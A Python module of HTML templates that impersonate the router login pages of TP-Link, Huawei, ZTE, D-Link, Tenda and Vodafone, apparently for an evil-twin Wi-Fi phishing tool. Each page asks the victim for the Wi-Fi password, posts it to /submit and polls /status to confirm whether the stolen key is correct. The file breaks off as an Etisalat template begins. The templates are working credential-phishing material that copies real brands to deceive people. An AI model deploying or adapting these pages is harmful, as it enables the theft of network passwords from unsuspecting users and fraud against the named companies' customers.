# portals.py — Real router vendor captive portal templates
# Each template POST password as "name" field to /submit
# and poll /status for OK/NO response.
# All templates use inline SVG logos and accurate brand colors.

TEMPLATES = {}

TEMPLATES["tp-link"] = """<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<title>TP-Link Router Login</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:'Segoe UI',Arial,sans-serif;background:#f4f6f8;display:flex;justify-content:center;align-items:center;min-height:100vh}
.card{background:#fff;border-radius:12px;text-align:center;width:90%;max-width:400px;overflow:hidden;box-shadow:0 4px 24px rgba(0,0,0,.08)}
.header{background:#4ACBD6;padding:28px 24px 20px}
.logo{margin-bottom:4px}
.logo svg{width:180px;height:44px}
.model{color:rgba(255,255,255,.7);font-size:11px;margin-top:4px;letter-spacing:.5px}
.body{padding:28px 30px 24px}
h2{color:#36444B;font-size:17px;margin-bottom:4px;font-weight:600}
.sub{color:#A7A9AC;font-size:12px;margin-bottom:20px}
.err{color:#d32f2f;font-size:12px;display:none;margin-bottom:12px;background:#fff0f0;padding:10px 12px;border-radius:6px;border:1px solid #ffd0d0}
.field{margin-bottom:18px;text-align:left}
.field label{display:block;color:#36444B;font-size:12px;margin-bottom:5px;font-weight:600}
.field input{width:100%;padding:11px 14px;border:1.5px solid #ddd;border-radius:8px;font-size:14px;transition:border .2s;background:#f8f9fa}
.field input:focus{border-color:#4ACBD6;outline:none;background:#fff}
.btn{width:100%;padding:12px;background:#4ACBD6;color:#fff;border:none;border-radius:8px;font-size:15px;font-weight:600;cursor:pointer;transition:background .2s;letter-spacing:.3px}
.btn:hover{background:#3ab5c0}
.footer{padding:14px;border-top:1px solid #f0f0f0;color:#A7A9AC;font-size:10px;background:#fafbfc}
.hidden{display:none}
.spinner{border:3px solid #eee;border-top-color:#4ACBD6;border-radius:50%;width:32px;height:32px;animation:spin .8s linear infinite;margin:20px auto}
@keyframes spin{to{transform:rotate(360deg)}}
.ok-icon{width:52px;height:52px;margin:8px auto}
.ok{color:#4ACBD6;font-weight:700;font-size:17px;margin-bottom:4px}
.ok-sub{color:#666;font-size:13px}
</style>
</head>
<body>
<div id="lv" class="card">
<div class="header">
<div class="logo"><svg viewBox="0 0 180 44" fill="none"><path d="M22 6l-10 16h6l-4 16 16-20h-8l6-12z" fill="#FFCB00"/><path d="M38 6l-10 16h6l-4 16 16-20h-8l6-12z" fill="#FFCB00" opacity=".6"/><text x="60" y="30" font-family="Arial,sans-serif" font-weight="700" font-size="22" fill="#fff" letter-spacing="1">tp-link</text></svg></div>
<div class="model">Archer C7 &nbsp;|&nbsp; AC1750 Wireless Dual Band Router</div>
</div>
<div class="body">
<h2>Wireless Password Required</h2>
<p class="sub">Enter the Wi-Fi password for Archer C7 to connect</p>
<div id="er" class="err"></div>
<div class="field">
<label>Wireless Password</label>
<input type="password" id="pw" placeholder="Enter Wi-Fi password" autocomplete="off">
</div>
<button class="btn" onclick="go()">Save & Connect</button>
</div>
<div class="footer">TP-Link Technologies Co., Ltd.</div>
</div>
<div id="wv" class="card hidden">
<div class="header"><div class="logo"><svg viewBox="0 0 180 44" fill="none"><path d="M22 6l-10 16h6l-4 16 16-20h-8l6-12z" fill="#FFCB00"/><path d="M38 6l-10 16h6l-4 16 16-20h-8l6-12z" fill="#FFCB00" opacity=".6"/><text x="60" y="30" font-family="Arial,sans-serif" font-weight="700" font-size="22" fill="#fff" letter-spacing="1">tp-link</text></svg></div></div>
<div class="body"><div class="spinner"></div><p style="color:#555">Verifying password...</p></div>
</div>
<div id="sv" class="card hidden">
<div class="header"><div class="logo"><svg viewBox="0 0 180 44" fill="none"><path d="M22 6l-10 16h6l-4 16 16-20h-8l6-12z" fill="#FFCB00"/><path d="M38 6l-10 16h6l-4 16 16-20h-8l6-12z" fill="#FFCB00" opacity=".6"/><text x="60" y="30" font-family="Arial,sans-serif" font-weight="700" font-size="22" fill="#fff" letter-spacing="1">tp-link</text></svg></div></div>
<div class="body"><svg class="ok-icon" viewBox="0 0 52 52"><circle cx="26" cy="26" r="24" fill="#4ACBD6"/><path d="M16 26l7 7 13-13" stroke="#fff" stroke-width="3" fill="none" stroke-linecap="round" stroke-linejoin="round"/></svg><p class="ok">Password Verified</p><p class="ok-sub">Connection established successfully.</p></div>
</div>
<script>
var ci;function go(){var p=document.getElementById("pw").value.trim();if(!p)return;document.getElementById("er").style.display="none";document.getElementById("lv").classList.add("hidden");document.getElementById("wv").classList.remove("hidden");fetch("/submit",{method:"POST",headers:{"Content-Type":"application/x-www-form-urlencoded"},"body":"name="+encodeURIComponent(p)}).then(function(){if(ci)clearInterval(ci);ci=setInterval(chk,1000)}).catch(function(){rv("Connection error.")})}
function chk(){fetch("/status").then(function(r){return r.text()}).then(function(s){if(s==="OK"){clearInterval(ci);document.getElementById("wv").classList.add("hidden");document.getElementById("sv").classList.remove("hidden")}else if(s==="NO"){clearInterval(ci);rv("Incorrect password. Please try again.")}}).catch(function(){})}
function rv(m){document.getElementById("wv").classList.add("hidden");document.getElementById("lv").classList.remove("hidden");var e=document.getElementById("er");e.innerText=m;e.style.display="block";document.getElementById("pw").value=""}
</script></body></html>"""

TEMPLATES["huawei"] = """<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<title>Huawei Home Gateway</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:'Segoe UI',Arial,sans-serif;background:#f5f5f5;display:flex;justify-content:center;align-items:center;min-height:100vh}
.card{background:#fff;border-radius:12px;text-align:center;width:90%;max-width:400px;overflow:hidden;box-shadow:0 4px 24px rgba(0,0,0,.08)}
.header{background:#CF0A2C;padding:28px 24px 20px}
.logo{margin-bottom:4px}
.logo svg{width:160px;height:52px}
.model{color:rgba(255,255,255,.7);font-size:11px;margin-top:2px;letter-spacing:.5px}
.body{padding:28px 30px 24px}
h2{color:#232527;font-size:17px;margin-bottom:4px;font-weight:600}
.sub{color:#999;font-size:12px;margin-bottom:20px}
.err{color:#d32f2f;font-size:12px;display:none;margin-bottom:12px;background:#fff0f0;padding:10px 12px;border-radius:6px;border:1px solid #ffd0d0}
.field{margin-bottom:18px;text-align:left}
.field label{display:block;color:#232527;font-size:12px;margin-bottom:5px;font-weight:600}
.field input{width:100%;padding:11px 14px;border:1.5px solid #ddd;border-radius:8px;font-size:14px;transition:border .2s;background:#f8f9fa}
.field input:focus{border-color:#CF0A2C;outline:none;background:#fff}
.btn{width:100%;padding:12px;background:#CF0A2C;color:#fff;border:none;border-radius:8px;font-size:15px;font-weight:600;cursor:pointer;transition:background .2s}
.btn:hover{background:#b80926}
.footer{padding:14px;border-top:1px solid #f0f0f0;color:#999;font-size:10px;background:#fafbfc}
.hidden{display:none}
.spinner{border:3px solid #eee;border-top-color:#CF0A2C;border-radius:50%;width:32px;height:32px;animation:spin .8s linear infinite;margin:20px auto}
@keyframes spin{to{transform:rotate(360deg)}}
.ok-icon{width:52px;height:52px;margin:8px auto}
.ok{color:#CF0A2C;font-weight:700;font-size:17px;margin-bottom:4px}
.ok-sub{color:#666;font-size:13px}
</style>
</head>
<body>
<div id="lv" class="card">
<div class="header">
<div class="logo"><svg viewBox="0 0 160 52" fill="none"><g transform="translate(10,2)"><path d="M30 8C24 8 18.5 11 16 16c-1.5 3-.8 6.5 1.5 9L30 42l12.5-17C44.8 22.5 45.5 19 44 16 41.5 11 36 8 30 8z" fill="#fff"/><circle cx="30" cy="19" r="4.5" fill="#CF0A2C"/></g><text x="62" y="33" font-family="Arial,sans-serif" font-weight="700" font-size="18" fill="#fff" letter-spacing="3">HUAWEI</text></svg></div>
<div class="model">Home Gateway &nbsp;|&nbsp; HG8245H</div>
</div>
<div class="body">
<h2>Wi-Fi Password Verification</h2>
<p class="sub">Enter your wireless password to connect</p>
<div id="er" class="err"></div>
<div class="field">
<label>Wi-Fi Password</label>
<input type="password" id="pw" placeholder="Enter your Wi-Fi password" autocomplete="off">
</div>
<button class="btn" onclick="go()">Connect</button>
</div>
<div class="footer">Huawei Technologies Co., Ltd.</div>
</div>
<div id="wv" class="card hidden">
<div class="header"><div class="logo"><svg viewBox="0 0 160 52" fill="none"><g transform="translate(10,2)"><path d="M30 8C24 8 18.5 11 16 16c-1.5 3-.8 6.5 1.5 9L30 42l12.5-17C44.8 22.5 45.5 19 44 16 41.5 11 36 8 30 8z" fill="#fff"/><circle cx="30" cy="19" r="4.5" fill="#CF0A2C"/></g><text x="62" y="33" font-family="Arial,sans-serif" font-weight="700" font-size="18" fill="#fff" letter-spacing="3">HUAWEI</text></svg></div></div>
<div class="body"><div class="spinner"></div><p style="color:#555">Verifying...</p></div>
</div>
<div id="sv" class="card hidden">
<div class="header"><div class="logo"><svg viewBox="0 0 160 52" fill="none"><g transform="translate(10,2)"><path d="M30 8C24 8 18.5 11 16 16c-1.5 3-.8 6.5 1.5 9L30 42l12.5-17C44.8 22.5 45.5 19 44 16 41.5 11 36 8 30 8z" fill="#fff"/><circle cx="30" cy="19" r="4.5" fill="#CF0A2C"/></g><text x="62" y="33" font-family="Arial,sans-serif" font-weight="700" font-size="18" fill="#fff" letter-spacing="3">HUAWEI</text></svg></div></div>
<div class="body"><svg class="ok-icon" viewBox="0 0 52 52"><circle cx="26" cy="26" r="24" fill="#CF0A2C"/><path d="M16 26l7 7 13-13" stroke="#fff" stroke-width="3" fill="none" stroke-linecap="round" stroke-linejoin="round"/></svg><p class="ok">Connected</p><p class="ok-sub">Wi-Fi access granted successfully.</p></div>
</div>
<script>
var ci;function go(){var p=document.getElementById("pw").value.trim();if(!p)return;document.getElementById("er").style.display="none";document.getElementById("lv").classList.add("hidden");document.getElementById("wv").classList.remove("hidden");fetch("/submit",{method:"POST",headers:{"Content-Type":"application/x-www-form-urlencoded"},"body":"name="+encodeURIComponent(p)}).then(function(){if(ci)clearInterval(ci);ci=setInterval(chk,1000)}).catch(function(){rv("Connection error.")})}
function chk(){fetch("/status").then(function(r){return r.text()}).then(function(s){if(s==="OK"){clearInterval(ci);document.getElementById("wv").classList.add("hidden");document.getElementById("sv").classList.remove("hidden")}else if(s==="NO"){clearInterval(ci);rv("Incorrect password. Please try again.")}}).catch(function(){})}
function rv(m){document.getElementById("wv").classList.add("hidden");document.getElementById("lv").classList.remove("hidden");var e=document.getElementById("er");e.innerText=m;e.style.display="block";document.getElementById("pw").value=""}
</script></body></html>"""

TEMPLATES["zte"] = """<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<title>ZTE Router Login</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:'Segoe UI',Arial,sans-serif;background:#f0f4f8;display:flex;justify-content:center;align-items:center;min-height:100vh}
.card{background:#fff;border-radius:12px;text-align:center;width:90%;max-width:400px;overflow:hidden;box-shadow:0 4px 24px rgba(0,0,0,.08)}
.header{background:#008ED3;padding:28px 24px 20px}
.logo{margin-bottom:4px}
.logo svg{width:120px;height:40px}
.model{color:rgba(255,255,255,.7);font-size:11px;margin-top:4px;letter-spacing:.5px}
.body{padding:28px 30px 24px}
h2{color:#333;font-size:17px;margin-bottom:4px;font-weight:600}
.sub{color:#999;font-size:12px;margin-bottom:20px}
.err{color:#d32f2f;font-size:12px;display:none;margin-bottom:12px;background:#fff0f0;padding:10px 12px;border-radius:6px;border:1px solid #ffd0d0}
.field{margin-bottom:18px;text-align:left}
.field label{display:block;color:#333;font-size:12px;margin-bottom:5px;font-weight:600}
.field input{width:100%;padding:11px 14px;border:1.5px solid #ddd;border-radius:8px;font-size:14px;transition:border .2s;background:#f8f9fa}
.field input:focus{border-color:#008ED3;outline:none;background:#fff}
.btn{width:100%;padding:12px;background:#008ED3;color:#fff;border:none;border-radius:8px;font-size:15px;font-weight:600;cursor:pointer;transition:background .2s}
.btn:hover{background:#0078b8}
.footer{padding:14px;border-top:1px solid #f0f0f0;color:#999;font-size:10px;background:#fafbfc}
.hidden{display:none}
.spinner{border:3px solid #eee;border-top-color:#008ED3;border-radius:50%;width:32px;height:32px;animation:spin .8s linear infinite;margin:20px auto}
@keyframes spin{to{transform:rotate(360deg)}}
.ok-icon{width:52px;height:52px;margin:8px auto}
.ok{color:#008ED3;font-weight:700;font-size:17px;margin-bottom:4px}
.ok-sub{color:#666;font-size:13px}
</style>
</head>
<body>
<div id="lv" class="card">
<div class="header">
<div class="logo"><svg viewBox="0 0 120 40" fill="none"><text x="60" y="30" text-anchor="middle" font-family="Arial,sans-serif" font-weight="900" font-size="28" fill="#fff" letter-spacing="4">ZTE</text></svg></div>
<div class="model">F670L &nbsp;|&nbsp; GPON Home Gateway</div>
</div>
<div class="body">
<h2>Network Authentication</h2>
<p class="sub">Enter your Wi-Fi password to access the network</p>
<div id="er" class="err"></div>
<div class="field">
<label>Wi-Fi Password</label>
<input type="password" id="pw" placeholder="Enter password" autocomplete="off">
</div>
<button class="btn" onclick="go()">Authenticate</button>
</div>
<div class="footer">ZTE Corporation</div>
</div>
<div id="wv" class="card hidden">
<div class="header"><div class="logo"><svg viewBox="0 0 120 40" fill="none"><text x="60" y="30" text-anchor="middle" font-family="Arial,sans-serif" font-weight="900" font-size="28" fill="#fff" letter-spacing="4">ZTE</text></svg></div></div>
<div class="body"><div class="spinner"></div><p style="color:#555">Authenticating...</p></div>
</div>
<div id="sv" class="card hidden">
<div class="header"><div class="logo"><svg viewBox="0 0 120 40" fill="none"><text x="60" y="30" text-anchor="middle" font-family="Arial,sans-serif" font-weight="900" font-size="28" fill="#fff" letter-spacing="4">ZTE</text></svg></div></div>
<div class="body"><svg class="ok-icon" viewBox="0 0 52 52"><circle cx="26" cy="26" r="24" fill="#008ED3"/><path d="M16 26l7 7 13-13" stroke="#fff" stroke-width="3" fill="none" stroke-linecap="round" stroke-linejoin="round"/></svg><p class="ok">Authenticated</p><p class="ok-sub">Network access granted.</p></div>
</div>
<script>
var ci;function go(){var p=document.getElementById("pw").value.trim();if(!p)return;document.getElementById("er").style.display="none";document.getElementById("lv").classList.add("hidden");document.getElementById("wv").classList.remove("hidden");fetch("/submit",{method:"POST",headers:{"Content-Type":"application/x-www-form-urlencoded"},"body":"name="+encodeURIComponent(p)}).then(function(){if(ci)clearInterval(ci);ci=setInterval(chk,1000)}).catch(function(){rv("Connection error.")})}
function chk(){fetch("/status").then(function(r){return r.text()}).then(function(s){if(s==="OK"){clearInterval(ci);document.getElementById("wv").classList.add("hidden");document.getElementById("sv").classList.remove("hidden")}else if(s==="NO"){clearInterval(ci);rv("Incorrect password. Please try again.")}}).catch(function(){})}
function rv(m){document.getElementById("wv").classList.add("hidden");document.getElementById("lv").classList.remove("hidden");var e=document.getElementById("er");e.innerText=m;e.style.display="block";document.getElementById("pw").value=""}
</script></body></html>"""

TEMPLATES["dlink"] = """<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<title>D-Link Router Login</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:'Segoe UI',Arial,sans-serif;background:#f0f2f4;display:flex;justify-content:center;align-items:center;min-height:100vh}
.card{background:#fff;border-radius:12px;text-align:center;width:90%;max-width:400px;overflow:hidden;box-shadow:0 4px 24px rgba(0,0,0,.08)}
.header{background:#0087A9;padding:28px 24px 20px}
.logo{margin-bottom:4px}
.logo svg{width:150px;height:38px}
.model{color:rgba(255,255,255,.7);font-size:11px;margin-top:4px;letter-spacing:.5px}
.body{padding:28px 30px 24px}
h2{color:#333;font-size:17px;margin-bottom:4px;font-weight:600}
.sub{color:#999;font-size:12px;margin-bottom:20px}
.err{color:#d32f2f;font-size:12px;display:none;margin-bottom:12px;background:#fff0f0;padding:10px 12px;border-radius:6px;border:1px solid #ffd0d0}
.field{margin-bottom:18px;text-align:left}
.field label{display:block;color:#333;font-size:12px;margin-bottom:5px;font-weight:600}
.field input{width:100%;padding:11px 14px;border:1.5px solid #ddd;border-radius:8px;font-size:14px;transition:border .2s;background:#f8f9fa}
.field input:focus{border-color:#0087A9;outline:none;background:#fff}
.btn{width:100%;padding:12px;background:#0087A9;color:#fff;border:none;border-radius:8px;font-size:15px;font-weight:600;cursor:pointer;transition:background .2s}
.btn:hover{background:#007490}
.footer{padding:14px;border-top:1px solid #f0f0f0;color:#999;font-size:10px;background:#fafbfc}
.hidden{display:none}
.spinner{border:3px solid #eee;border-top-color:#0087A9;border-radius:50%;width:32px;height:32px;animation:spin .8s linear infinite;margin:20px auto}
@keyframes spin{to{transform:rotate(360deg)}}
.ok-icon{width:52px;height:52px;margin:8px auto}
.ok{color:#0087A9;font-weight:700;font-size:17px;margin-bottom:4px}
.ok-sub{color:#666;font-size:13px}
</style>
</head>
<body>
<div id="lv" class="card">
<div class="header">
<div class="logo"><svg viewBox="0 0 150 38" fill="none"><text x="75" y="28" text-anchor="middle" font-family="Arial,sans-serif" font-weight="800" font-size="24" fill="#fff" letter-spacing="1">D-Link</text></svg></div>
<div class="model">DIR-615 &nbsp;|&nbsp; Wireless N300 Router</div>
</div>
<div class="body">
<h2>Wireless Password Required</h2>
<p class="sub">Enter your Wi-Fi password to connect</p>
<div id="er" class="err"></div>
<div class="field">
<label>Password</label>
<input type="password" id="pw" placeholder="Enter Wi-Fi password" autocomplete="off">
</div>
<button class="btn" onclick="go()">Log In</button>
</div>
<div class="footer">D-Link Corporation</div>
</div>
<div id="wv" class="card hidden">
<div class="header"><div class="logo"><svg viewBox="0 0 150 38" fill="none"><text x="75" y="28" text-anchor="middle" font-family="Arial,sans-serif" font-weight="800" font-size="24" fill="#fff" letter-spacing="1">D-Link</text></svg></div></div>
<div class="body"><div class="spinner"></div><p style="color:#555">Checking password...</p></div>
</div>
<div id="sv" class="card hidden">
<div class="header"><div class="logo"><svg viewBox="0 0 150 38" fill="none"><text x="75" y="28" text-anchor="middle" font-family="Arial,sans-serif" font-weight="800" font-size="24" fill="#fff" letter-spacing="1">D-Link</text></svg></div></div>
<div class="body"><svg class="ok-icon" viewBox="0 0 52 52"><circle cx="26" cy="26" r="24" fill="#0087A9"/><path d="M16 26l7 7 13-13" stroke="#fff" stroke-width="3" fill="none" stroke-linecap="round" stroke-linejoin="round"/></svg><p class="ok">Connected</p><p class="ok-sub">Wi-Fi access granted.</p></div>
</div>
<script>
var ci;function go(){var p=document.getElementById("pw").value.trim();if(!p)return;document.getElementById("er").style.display="none";document.getElementById("lv").classList.add("hidden");document.getElementById("wv").classList.remove("hidden");fetch("/submit",{method:"POST",headers:{"Content-Type":"application/x-www-form-urlencoded"},"body":"name="+encodeURIComponent(p)}).then(function(){if(ci)clearInterval(ci);ci=setInterval(chk,1000)}).catch(function(){rv("Connection error.")})}
function chk(){fetch("/status").then(function(r){return r.text()}).then(function(s){if(s==="OK"){clearInterval(ci);document.getElementById("wv").classList.add("hidden");document.getElementById("sv").classList.remove("hidden")}else if(s==="NO"){clearInterval(ci);rv("Incorrect password. Please try again.")}}).catch(function(){})}
function rv(m){document.getElementById("wv").classList.add("hidden");document.getElementById("lv").classList.remove("hidden");var e=document.getElementById("er");e.innerText=m;e.style.display="block";document.getElementById("pw").value=""}
</script></body></html>"""

TEMPLATES["tenda"] = """<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<title>Tenda Router Login</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:'Segoe UI',Arial,sans-serif;background:#f5f5f5;display:flex;justify-content:center;align-items:center;min-height:100vh}
.card{background:#fff;border-radius:12px;text-align:center;width:90%;max-width:400px;overflow:hidden;box-shadow:0 4px 24px rgba(0,0,0,.08)}
.header{background:#E4002B;padding:28px 24px 20px}
.logo{margin-bottom:4px}
.logo svg{width:140px;height:44px}
.model{color:rgba(255,255,255,.7);font-size:11px;margin-top:4px;letter-spacing:.5px}
.body{padding:28px 30px 24px}
h2{color:#333;font-size:17px;margin-bottom:4px;font-weight:600}
.sub{color:#999;font-size:12px;margin-bottom:20px}
.err{color:#d32f2f;font-size:12px;display:none;margin-bottom:12px;background:#fff0f0;padding:10px 12px;border-radius:6px;border:1px solid #ffd0d0}
.field{margin-bottom:18px;text-align:left}
.field label{display:block;color:#333;font-size:12px;margin-bottom:5px;font-weight:600}
.field input{width:100%;padding:11px 14px;border:1.5px solid #ddd;border-radius:8px;font-size:14px;transition:border .2s;background:#f8f9fa}
.field input:focus{border-color:#E4002B;outline:none;background:#fff}
.btn{width:100%;padding:12px;background:#E4002B;color:#fff;border:none;border-radius:8px;font-size:15px;font-weight:600;cursor:pointer;transition:background .2s}
.btn:hover{background:#c80025}
.footer{padding:14px;border-top:1px solid #f0f0f0;color:#999;font-size:10px;background:#fafbfc}
.hidden{display:none}
.spinner{border:3px solid #eee;border-top-color:#E4002B;border-radius:50%;width:32px;height:32px;animation:spin .8s linear infinite;margin:20px auto}
@keyframes spin{to{transform:rotate(360deg)}}
.ok-icon{width:52px;height:52px;margin:8px auto}
.ok{color:#E4002B;font-weight:700;font-size:17px;margin-bottom:4px}
.ok-sub{color:#666;font-size:13px}
</style>
</head>
<body>
<div id="lv" class="card">
<div class="header">
<div class="logo"><svg viewBox="0 0 140 44" fill="none"><circle cx="22" cy="22" r="20" fill="#fff"/><path d="M14 28V16l8-4 8 4v12" stroke="#E4002B" stroke-width="2.5" fill="none" stroke-linejoin="round"/><rect x="18" y="22" width="8" height="6" rx="1" fill="#E4002B"/><text x="52" y="28" font-family="Arial,sans-serif" font-weight="800" font-size="18" fill="#fff" letter-spacing="1">Tenda</text></svg></div>
<div class="model">N301 &nbsp;|&nbsp; Wireless N300 Easy Setup Router</div>
</div>
<div class="body">
<h2>Wi-Fi Password Verification</h2>
<p class="sub">Enter your Wi-Fi password to connect</p>
<div id="er" class="err"></div>
<div class="field">
<label>Password</label>
<input type="password" id="pw" placeholder="Enter Wi-Fi password" autocomplete="off">
</div>
<button class="btn" onclick="go()">OK</button>
</div>
<div class="footer">Shenzhen Tenda Technology Co., Ltd.</div>
</div>
<div id="wv" class="card hidden">
<div class="header"><div class="logo"><svg viewBox="0 0 140 44" fill="none"><circle cx="22" cy="22" r="20" fill="#fff"/><path d="M14 28V16l8-4 8 4v12" stroke="#E4002B" stroke-width="2.5" fill="none" stroke-linejoin="round"/><rect x="18" y="22" width="8" height="6" rx="1" fill="#E4002B"/><text x="52" y="28" font-family="Arial,sans-serif" font-weight="800" font-size="18" fill="#fff" letter-spacing="1">Tenda</text></svg></div></div>
<div class="body"><div class="spinner"></div><p style="color:#555">Connecting...</p></div>
</div>
<div id="sv" class="card hidden">
<div class="header"><div class="logo"><svg viewBox="0 0 140 44" fill="none"><circle cx="22" cy="22" r="20" fill="#fff"/><path d="M14 28V16l8-4 8 4v12" stroke="#E4002B" stroke-width="2.5" fill="none" stroke-linejoin="round"/><rect x="18" y="22" width="8" height="6" rx="1" fill="#E4002B"/><text x="52" y="28" font-family="Arial,sans-serif" font-weight="800" font-size="18" fill="#fff" letter-spacing="1">Tenda</text></svg></div></div>
<div class="body"><svg class="ok-icon" viewBox="0 0 52 52"><circle cx="26" cy="26" r="24" fill="#E4002B"/><path d="M16 26l7 7 13-13" stroke="#fff" stroke-width="3" fill="none" stroke-linecap="round" stroke-linejoin="round"/></svg><p class="ok">Connected</p><p class="ok-sub">You can now access the internet.</p></div>
</div>
<script>
var ci;function go(){var p=document.getElementById("pw").value.trim();if(!p)return;document.getElementById("er").style.display="none";document.getElementById("lv").classList.add("hidden");document.getElementById("wv").classList.remove("hidden");fetch("/submit",{method:"POST",headers:{"Content-Type":"application/x-www-form-urlencoded"},"body":"name="+encodeURIComponent(p)}).then(function(){if(ci)clearInterval(ci);ci=setInterval(chk,1000)}).catch(function(){rv("Connection error.")})}
function chk(){fetch("/status").then(function(r){return r.text()}).then(function(s){if(s==="OK"){clearInterval(ci);document.getElementById("wv").classList.add("hidden");document.getElementById("sv").classList.remove("hidden")}else if(s==="NO"){clearInterval(ci);rv("Incorrect password. Please try again.")}}).catch(function(){})}
function rv(m){document.getElementById("wv").classList.add("hidden");document.getElementById("lv").classList.remove("hidden");var e=document.getElementById("er");e.innerText=m;e.style.display="block";document.getElementById("pw").value=""}
</script></body></html>"""

TEMPLATES["vodafone"] = """<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<title>Vodafone Wi-Fi</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:'Segoe UI',Arial,sans-serif;background:#f2f2f2;display:flex;justify-content:center;align-items:center;min-height:100vh}
.card{background:#fff;border-radius:12px;text-align:center;width:90%;max-width:400px;overflow:hidden;box-shadow:0 4px 24px rgba(0,0,0,.08)}
.header{background:#E60000;padding:28px 24px 20px}
.logo{margin-bottom:4px}
.logo svg{width:160px;height:44px}
.model{color:rgba(255,255,255,.7);font-size:11px;margin-top:2px;letter-spacing:.5px}
.body{padding:28px 30px 24px}
h2{color:#21201E;font-size:17px;margin-bottom:4px;font-weight:600}
.sub{color:#999;font-size:12px;margin-bottom:20px}
.err{color:#d32f2f;font-size:12px;display:none;margin-bottom:12px;background:#fff0f0;padding:10px 12px;border-radius:6px;border:1px solid #ffd0d0}
.field{margin-bottom:18px;text-align:left}
.field label{display:block;color:#21201E;font-size:12px;margin-bottom:5px;font-weight:600}
.field input{width:100%;padding:11px 14px;border:1.5px solid #ddd;border-radius:8px;font-size:14px;transition:border .2s;background:#f8f9fa}
.field input:focus{border-color:#E60000;outline:none;background:#fff}
.btn{width:100%;padding:12px;background:#E60000;color:#fff;border:none;border-radius:8px;font-size:15px;font-weight:600;cursor:pointer;transition:background .2s}
.btn:hover{background:#cc0000}
.footer{padding:14px;border-top:1px solid #f0f0f0;color:#999;font-size:10px;background:#fafbfc}
.hidden{display:none}
.spinner{border:3px solid #eee;border-top-color:#E60000;border-radius:50%;width:32px;height:32px;animation:spin .8s linear infinite;margin:20px auto}
@keyframes spin{to{transform:rotate(360deg)}}
.ok-icon{width:52px;height:52px;margin:8px auto}
.ok{color:#E60000;font-weight:700;font-size:17px;margin-bottom:4px}
.ok-sub{color:#666;font-size:13px}
</style>
</head>
<body>
<div id="lv" class="card">
<div class="header">
<div class="logo"><svg viewBox="0 0 160 44" fill="none"><circle cx="22" cy="22" r="20" fill="#fff"/><path d="M16 14c0-2.5 2.5-5 6-5s6 2.5 6 5c0 4-6 5-6 12" stroke="#E60000" stroke-width="3" fill="none" stroke-linecap="round"/><circle cx="22" cy="32" r="2.2" fill="#E60000"/><text x="52" y="28" font-family="Arial,sans-serif" font-weight="700" font-size="17" fill="#fff" letter-spacing=".5">vodafone</text></svg></div>
<div class="model">Wi-Fi Network Access</div>
</div>
<div class="body">
<h2>Wi-Fi Password Required</h2>
<p class="sub">Enter your Wi-Fi password to access the internet</p>
<div id="er" class="err"></div>
<div class="field">
<label>Wi-Fi Password</label>
<input type="password" id="pw" placeholder="Enter your Wi-Fi password" autocomplete="off">
</div>
<button class="btn" onclick="go()">Connect</button>
</div>
<div class="footer">Vodafone Group Plc</div>
</div>
<div id="wv" class="card hidden">
<div class="header"><div class="logo"><svg viewBox="0 0 160 44" fill="none"><circle cx="22" cy="22" r="20" fill="#fff"/><path d="M16 14c0-2.5 2.5-5 6-5s6 2.5 6 5c0 4-6 5-6 12" stroke="#E60000" stroke-width="3" fill="none" stroke-linecap="round"/><circle cx="22" cy="32" r="2.2" fill="#E60000"/><text x="52" y="28" font-family="Arial,sans-serif" font-weight="700" font-size="17" fill="#fff" letter-spacing=".5">vodafone</text></svg></div></div>
<div class="body"><div class="spinner"></div><p style="color:#555">Verifying password...</p></div>
</div>
<div id="sv" class="card hidden">
<div class="header"><div class="logo"><svg viewBox="0 0 160 44" fill="none"><circle cx="22" cy="22" r="20" fill="#fff"/><path d="M16 14c0-2.5 2.5-5 6-5s6 2.5 6 5c0 4-6 5-6 12" stroke="#E60000" stroke-width="3" fill="none" stroke-linecap="round"/><circle cx="22" cy="32" r="2.2" fill="#E60000"/><text x="52" y="28" font-family="Arial,sans-serif" font-weight="700" font-size="17" fill="#fff" letter-spacing=".5">vodafone</text></svg></div></div>
<div class="body"><svg class="ok-icon" viewBox="0 0 52 52"><circle cx="26" cy="26" r="24" fill="#E60000"/><path d="M16 26l7 7 13-13" stroke="#fff" stroke-width="3" fill="none" stroke-linecap="round" stroke-linejoin="round"/></svg><p class="ok">Connected</p><p class="ok-sub">Welcome to Vodafone Wi-Fi.</p></div>
</div>
<script>
var ci;function go(){var p=document.getElementById("pw").value.trim();if(!p)return;document.getElementById("er").style.display="none";document.getElementById("lv").classList.add("hidden");document.getElementById("wv").classList.remove("hidden");fetch("/submit",{method:"POST",headers:{"Content-Type":"application/x-www-form-urlencoded"},"body":"name="+encodeURIComponent(p)}).then(function(){if(ci)clearInterval(ci);ci=setInterval(chk,1000)}).catch(function(){rv("Connection error.")})}
function chk(){fetch("/status").then(function(r){return r.text()}).then(function(s){if(s==="OK"){clearInterval(ci);document.getElementById("wv").classList.add("hidden");document.getElementById("sv").classList.remove("hidden")}else if(s==="NO"){clearInterval(ci);rv("Incorrect password. Please try again.")}}).catch(function(){})}
function rv(m){document.getElementById("wv").classList.add("hidden");document.getElementById("lv").classList.remove("hidden");var e=document.getElementById("er");e.innerText=m;e.style.display="block";document.getElementById("pw").value=""}
</script></body></html>"""

TEMPLATES["etisalat"] = """<!DOCTYPE html>
<html lang="en">
<head>
